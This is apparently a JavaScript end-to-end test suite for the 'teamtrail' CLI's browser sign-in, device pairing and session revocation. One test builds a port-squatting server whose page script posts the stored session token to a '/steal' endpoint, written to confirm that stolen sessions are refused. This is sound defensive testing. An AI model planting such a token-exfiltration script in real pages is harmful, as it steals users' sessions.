// Sign-in, end to end against the built CLI: the API answers nobody without a paired browser, the link `teamtrail`
// prints works once, the browser `teamtrail` and `teamtrail pair` open signs in with one click (and no code on a
// command line), `teamtrail pair` makes another, a revoked browser drops to "Pair this browser" while open, and
// a device on the network pairs with the short code from Settings and gets no more than a device may.
import { spawn } from 'node:child_process';
import fs from 'node:fs';
import http from 'node:http';
import os from 'node:os';
import path from 'node:path';
import { lookoutLinks, pairLink, sessionHeaders, shootThemes, signInWith } from './e2eHelpers.mjs';
import { verifyLoopback } from './verifyLoopback.mjs';
import { verifyOpenSignedIn } from './verifyOpenSignedIn.mjs';

async function startLookout(cli, cwd, env, port = '0') {
  // On every interface, so a "device" can come in by the network address.
  const server = spawn(process.execPath, [cli, '--no-open', '--port', port, '--host', '0.0.0.0'], { cwd, env });
  const links = await new Promise((resolve, reject) => {
    let out = '';
    server.stdout.on('data', (c) => {
      out += c;
      const found = lookoutLinks(out);
      if (found) resolve(found);
    });
    server.on('exit', (code) => reject(new Error(`teamtrail exited ${code}: ${out}`)));
  });
  return { server, ...links };
}

/** The pairing link in the QR code Settings shows, read back by the browser's own barcode reader where it has one. */
async function readQr(page) {
  return page.evaluate(async () => {
    if (!('BarcodeDetector' in window)) return undefined;
    const svg = document.querySelector('.si-qr');
    const img = new Image();
    img.src = `data:image/svg+xml;base64,${btoa(new XMLSerializer().serializeToString(svg))}`;
    await img.decode();
    const canvas = document.createElement('canvas');
    canvas.width = canvas.height = 400;
    canvas.getContext('2d').drawImage(img, 0, 0, 400, 400);
    const [code] = await new window.BarcodeDetector({ formats: ['qr_code'] }).detect(canvas);
    return code?.rawValue;
  });
}

/**
 * Another server on this host, opened in the same paired browser (an agent's dev server on another port): what the
 * browser sends it, what its page can read, and whether its page can reach the Lookout's API. Nothing usable.
 */
async function anotherPortSeesNothing(page, lookoutUrl) {
  const seen = [];
  const other = http.createServer((req, res) => {
    seen.push(JSON.stringify(req.headers));
    res.setHeader('Content-Type', 'text/html');
    res.end('<!doctype html><title>dev server</title><p>an agent’s dev server</p>');
  });
  await new Promise((r) => other.listen(0, '127.0.0.1', r));
  const at = `http://localhost:${other.address().port}/`;
  try {
    const session = await page.evaluate(() => JSON.parse(localStorage.getItem('teamtrail.session') ?? '{}').secret);
    await page.goto(at);
    const read = await page.evaluate(async (api) => {
      const reached = await fetch(`${api}__teamtrail/list`, { headers: { 'X-Teamtrail-Session': 'x' } }).then(
        (r) => r.status,
        () => 'blocked',
      );
      return { storage: localStorage.getItem('teamtrail.session'), cookie: document.cookie, reached };
    }, lookoutUrl);
    await page.goBack();
    const leaked = seen.some((h) => h.includes(session) || /teamtrail/i.test(h));
    const ok =
      !!session && !leaked && read.storage === null && !read.cookie.includes(session) && read.reached === 'blocked';
    return {
      ok,
      said: `a server on another port got ${leaked ? 'THE SESSION' : 'nothing'}, its page read ${read.storage === null ? 'nothing' : 'THE SESSION'} and reached the API: ${read.reached}`,
    };
  } finally {
    other.close();
  }
}

/**
 * The Lookout stops with the tab open, and another server takes its port (an agent's): the tab sends it no session,
 * only asks it to prove itself, and says Teamtrail isn't running. Whatever that server's own page then reads from
 * the tab's storage is dead once the Lookout starts again. Returns the restarted Lookout.
 */
async function squatterGetsNothing({ cli, top, env, server, url, page, shots }) {
  const secret = (await sessionHeaders(page))['X-Teamtrail-Session'];
  const port = new URL(url).port;
  await new Promise((r) => (server.once('exit', r), server.kill('SIGTERM')));
  const heard = [];
  let stolen;
  const squatter = http.createServer((req, res) => {
    let body = '';
    req.on('data', (c) => (body += c));
    req.on('end', () => {
      heard.push(`${req.method} ${req.url} ${JSON.stringify(req.headers)} ${body}`);
      if (req.url === '/steal') stolen = JSON.parse(body || '{}');
      if (req.url.includes('/prove')) return res.end(JSON.stringify({ proof: 'f'.repeat(64) }));
      const page = !req.url.startsWith('/__teamtrail');
      res.setHeader('Content-Type', page ? 'text/html' : 'application/json');
      res.end(
        page
          ? `<!doctype html><script>fetch('/steal',{method:'POST',body:localStorage.getItem('teamtrail.session')})</script>`
          : '{}',
      );
    });
  });
  await new Promise((r) => squatter.listen(Number(port), r));
  await page.getByText('isn’t running here').waitFor({ timeout: 30_000 });
  await shootThemes(page, shots, '38-sign-in-not-running');
  const leaked = heard.some((h) => h.includes(secret));
  // a reload on the squatter's port runs its page in the Lookout's origin: it reads the storage
  await page.reload();
  const until = Date.now() + 10_000;
  while (!stolen && Date.now() < until) await new Promise((r) => setTimeout(r, 100));
  await new Promise((r) => (squatter.closeAllConnections(), squatter.close(r)));
  const restarted = await startLookout(cli, top, env, port);
  const replay = await fetch(`${url}__teamtrail/list`, {
    headers: { 'X-Teamtrail-Session': stolen?.secret ?? secret },
  });
  await page.goto(url);
  await page.getByRole('heading', { name: 'Pair this browser' }).waitFor({ timeout: 15_000 });
  const ok = !leaked && !!stolen && replay.status === 401;
  const said = `a server on the stopped Lookout's port got ${leaked ? 'THE SESSION' : 'no session'} from the open tab (shown: isn't running here); its page read ${stolen ? 'the stored session' : 'NOTHING (unexpected)'}, refused (${replay.status}) once the Lookout restarted`;
  return { ok, said, server: restarted.server };
}

const getStarted = async (page) => {
  await page.locator('.dialog.onboarding').waitFor({ timeout: 15_000 });
  await page.getByRole('button', { name: 'Get started' }).click();
};

/** A phone on the network pairs with the code from Settings; it can read, never change this machine's settings. */
async function devicePairing({ browser, page, shots }) {
  await page.getByRole('button', { name: 'Pair a device' }).click();
  await page.locator('.si-qr').waitFor();
  const code = await page.locator('.si-code-value').innerText();
  const scanned = await readQr(page);
  await shootThemes(page, shots, '36-sign-in-device-code');
  const lan = new URL(scanned ?? (await page.locator('.si-code-words code').innerText()));
  const phone = await browser.newPage({ viewport: { width: 390, height: 844 } });
  await phone.goto(`${lan.origin}/`);
  await phone.getByLabel('Pairing code').fill(code.toLowerCase());
  await phone.getByRole('button', { name: 'Pair' }).click();
  await getStarted(phone);
  const policy = await phone.request.put(`${lan.origin}/__teamtrail/policy`, {
    data: {},
    headers: await sessionHeaders(phone),
  });
  await phone.goto(`${lan.origin}/?settings=devices`);
  await phone.getByText('This device is paired with the Lookout').waitFor({ timeout: 15_000 });
  await phone.close();
  await page.getByRole('button', { name: 'Done' }).click();
  await page.getByText('Another device').waitFor({ timeout: 15_000 });
  const ok = policy.status() === 403 && (scanned === undefined || scanned.endsWith(code.replace('-', '')));
  return {
    ok,
    said: `a phone paired by ${scanned ? 'the QR code' : 'the typed code'}, its settings write ${policy.status()}`,
  };
}

export async function verifySignIn({ browser, cli, log, shots }) {
  const top = fs.mkdtempSync(path.join(os.tmpdir(), 'teamtrail-sign-in-e2e-'));
  fs.mkdirSync(path.join(top, '.teamtrail'));
  const env = { ...process.env, TEAMTRAIL_CONFIG_DIR: path.join(top, 'config') };
  const started = await startLookout(cli, top, env);
  const { url, pair } = started;
  let server = started.server;
  const pages = [];
  const newPage = async (viewport = { width: 1440, height: 900 }) => {
    const p = await browser.newPage({ viewport });
    pages.push(p);
    return p;
  };
  try {
    // Nobody but a paired browser: not a script on this machine, not the event stream.
    const bare = await Promise.all(['list', 'events', 'remote-agents'].map((p) => fetch(`${url}__teamtrail/${p}`)));
    const session = await (await fetch(`${url}__teamtrail/session`)).json();
    const closed = bare.every((r) => r.status === 401) && session.signedIn === false;
    const opened = await verifyOpenSignedIn({ browser, cli, env });
    const address = await verifyLoopback({ url, pair, opened: opened.target });

    const a = await newPage();
    await a.goto(url);
    await a.getByRole('heading', { name: 'Pair this browser' }).waitFor({ timeout: 15_000 });
    await shootThemes(a, shots, '35-sign-in-pair');
    // The link opens the Lookout's page, which takes the code out of the address bar and signs in on a click.
    await a.goto(pair);
    await a.getByRole('button', { name: 'Sign in this browser' }).waitFor({ timeout: 15_000 });
    const codeGone = a.url() === url;
    await shootThemes(a, shots, '35-sign-in-confirm');
    await a.getByRole('button', { name: 'Sign in this browser' }).click();
    await getStarted(a);

    // The same link again, in another browser: spent.
    const b = await newPage();
    await b.goto(pair);
    await b.getByRole('button', { name: 'Sign in this browser' }).click();
    await b.getByText('This link was already used').waitFor({ timeout: 15_000 });
    // `teamtrail pair` makes a new one.
    await signInWith(b, pairLink({ cli, cwd: top, env }));
    await getStarted(b);
    const otherPort = await anotherPortSeesNothing(a, url);

    await a.goto(`${url}?settings=devices`);
    const rows = a.locator('#settings-devices .ra-row');
    await rows.nth(1).waitFor({ timeout: 15_000 });
    const listed = await rows.count();
    const lan = await a.getByRole('button', { name: 'Pair a device' }).isVisible();
    const device = lan
      ? await devicePairing({ browser, page: a, shots })
      : { ok: true, said: 'no network address: device pairing skipped' };
    await a.locator('#settings-devices').scrollIntoViewIfNeeded();
    await shootThemes(a, shots, '37-sign-in-devices');

    // Revoked while it is open: that browser's event stream ends and it shows "Pair this browser".
    const other = rows.filter({ hasNotText: 'this browser' }).filter({ hasText: 'This machine' }).first();
    await other.getByRole('button', { name: /^Revoke/ }).click();
    await other.getByRole('button', { name: /^Revoke .+/ }).click();
    await b.getByRole('heading', { name: 'Pair this browser' }).waitFor({ timeout: 15_000 });

    const squat = await squatterGetsNothing({ cli, top, env, server, url, page: a, shots });
    server = squat.server;
    const ok = closed && opened.ok && address.ok && codeGone && listed === 2 && device.ok && otherPort.ok && squat.ok;
    log(
      `sign-in ${ok ? 'ok' : 'WRONG'}: ${opened.said}; ${address.said}; API without a session ${bare.map((r) => r.status).join('/')}; link used once${codeGone ? ', code gone from the address bar' : ', code LEFT in the URL'}; teamtrail pair signed in a second browser; ${listed} paired browsers listed; ${device.said}; the revoked browser dropped to Pair this browser; ${otherPort.said}; ${squat.said}`,
    );
    return ok;
  } catch (e) {
    log(`sign-in WRONG: ${e.message}`);
    return false;
  } finally {
    for (const p of pages) await p.close().catch(() => {});
    server.kill('SIGTERM');
    fs.rmSync(top, { recursive: true, force: true });
  }
}
